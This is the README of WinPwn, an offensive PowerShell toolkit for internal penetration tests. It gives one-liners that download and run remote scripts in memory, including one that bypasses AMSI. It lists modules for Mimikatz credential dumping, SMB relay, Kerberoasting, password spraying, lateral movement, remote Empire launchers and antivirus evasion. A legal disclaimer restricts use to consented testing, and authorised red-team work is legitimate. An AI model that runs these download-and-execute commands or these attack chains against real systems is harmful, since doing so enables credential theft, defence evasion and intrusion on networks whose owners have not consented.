# WinPwn
In many past internal penetration tests I often had problems with the existing Powershell Recon / Exploitation scripts due to missing proxy support. I often ran the same scripts one after the other to get information about the current system and/or the domain. To automate this process and for the proxy reason I wrote my own script with automatic proxy recognition and integration. 
The script is mostly based on well-known large other offensive security Powershell projects. They are loaded into RAM via IEX Downloadstring.

Yes it is not a C# and it may be flagged by antivirus solutions. Windows Defender for example blocks some of the known scripts/functions. Maybe someday a C# Version will follow.

Any suggestions, feedback and comments are welcome!

Just Import the Modules with:
`Import-Module .\WinPwn_v0.7.ps1` or 
`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.7.ps1')`

For AMSI Bypass use the following oneliner:
`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/ObfusWinPwn.ps1')`

Functions available after Import:
* #### `WinPwn` -> Guides the user through all functions/Modules with simple questions.
* #### `Inveigh` -> Executes Inveigh in a new Console window , SMB-Relay attacks with Session management (Invoke-TheHash) integrated
* #### `sessionGopher` -> Executes Sessiongopher Asking you for parameters
* #### `Mimikatzlocal` -> Executes Invoke-WCMDump and Invoke-Mimikatz
* #### `localreconmodules` -> 
  * Checks the Powershell event logs for credentials or other sensitive informations
  * Checks for WSUS Server over HTTP (Fake Update vulnerability)
  * Checks the local SMB-Signing state
  * Collects various local system informations (Installed Software + vulnerable software, Shares, privileges, local groups, network information
  * Searches for passwords in the registry as well as in files on the hard disk + Browser Credentials
  * Search for .NET Binaries on the local system (which can be reverse engineered for vulnerability analysis) 
  * Optional: Get-Computerdetails (Powersploit) , Just another Windows Privilege escalation script, Winspect
* #### `JAWS` -> Just another Windows Privilege Escalation script
* #### `domainreconmodules` -> 
  * Powerview function output gets stored on disk for review. 
  * A search for AD-Passwords in description fields is done. 
  * Unconstrained delegation systems/users are enumerated. 
  * SQL Server discovery and Auditing functions (default credentials, passwords in the database and more).
  * MS-RPRN Check for Domaincontrollers
  * An AD-Report is generated in CSV Files (or XLS if excel is installed) with ADRecon. 
* #### `Privescmodules` -> Executes different privesc scripts in memory (PowerUp Allchecks, Sherlock, GPPPasswords)
* #### `lazagnemodule` -> Downloads and executes lazagne.exe (if not detected by AV) 
* #### `latmov` -> Searches for Systems with Admin-Access in the domain for lateral movement. Mass-Mimikatz can be used after for the found systems. DomainPassword-Spray for new Credentials can also be used here.
* #### `empirelauncher` -> Launch powershell empire oneliner on remote Systems
* #### `shareenumeration` -> Invoke-Filefinder and Invoke-Sharefinder (Powerview / Powersploit)
* #### `groupsearch` -> Get-DomainGPOUserLocalGroupMapping - find Systems where you have Admin-access or RDP access to via Group Policy Mapping (Powerview / Powersploit)
* #### `Kerberoasting` -> Executes Invoke-Kerberoast in a new window and stores the hashes for later cracking
* #### `powerSQL` -> SQL Server discovery, Check access with current user, Audit for default credentials + UNCPath Injection Attacks
* #### `Sharphound` -> Downloads Sharphound and collects Information for the Bloodhound DB
* #### `adidnswildcard` -> Create a Active Directory-Integrated DNS Wildcard Record and run Inveigh for mass hash gathering.
* #### `MS17-10` -> Scan active windows Servers in the domain or all systems for MS17-10 (Eternalblue) vulnerability

The submodule is a forked and edited version of https://github.com/Cn33liz/p0wnedShell. You can compile it yourself and use it for powershell restriction bypass and AMSI-Bypass. Most AV-Solutions can be evaded this way. Just run the executable File, choose 17. and execute WinPwn.

![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/p0wnedmenu.PNG)

![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/p0wned.png)

## TO-DO
- [x] Some obfuskation
- [ ] More obfuscation
- [ ] Proxy via PAC-File support
- [x] Get the scripts from my own creds repository (https://github.com/SecureThisShit/Creds) to be independent from changes in the original repositories
- [ ] More Recon/Exploitation functions
- [ ] msDS-AllowedToActOnBehalfOfOtherIdentity Ressource based constrained delegation
- [x] Add MS17-10 Scanner
- [ ] Add menu for better handling of functions
- [x] Amsi Bypass

![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/Pwn.png)

## CREDITS

- [X] [Kevin-Robertson](https://github.com/Kevin-Robertson/) - Inveigh, Powermad, Invoke-TheHash
- [X] [Arvanaghi](https://github.com/Arvanaghi/) - SessionGopher
- [X] [PowerShellMafia](https://github.com/PowerShellMafia/) - Powersploit
- [X] [Dionach](https://github.com/Dionach/) - PassHunt
- [X] [A-mIn3](https://github.com/A-mIn3/) - WINSpect
- [X] [411Hall](https://github.com/411Hall/) - JAWS
- [X] [sense-of-security](https://github.com/sense-of-security/) - ADrecon
- [X] [dafthack](https://github.com/dafthack/) - DomainPasswordSpray
- [X] [rasta-mouse](https://github.com/rasta-mouse/) - Sherlock
- [X] [AlessandroZ](https://github.com/AlessandroZ/) - LaZagne
- [X] [samratashok](https://github.com/samratashok/) - nishang
- [X] [leechristensen](https://github.com/leechristensen/) - Random Repo
- [X] [HarmJ0y](https://github.com/HarmJ0y) - Many good Blogposts, Gists and Scripts
- [X] [NETSPI](https://github.com/NetSPI/) - PowerUpSQL
- [X] [Cn33liz](https://github.com/Cn33liz/) - p0wnedShell
- [X] [rasta-mouse](https://github.com/rasta-mouse/) - Amsi AmsiScanBufferBypass

## Legal disclaimer:
Usage of WinPwn for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
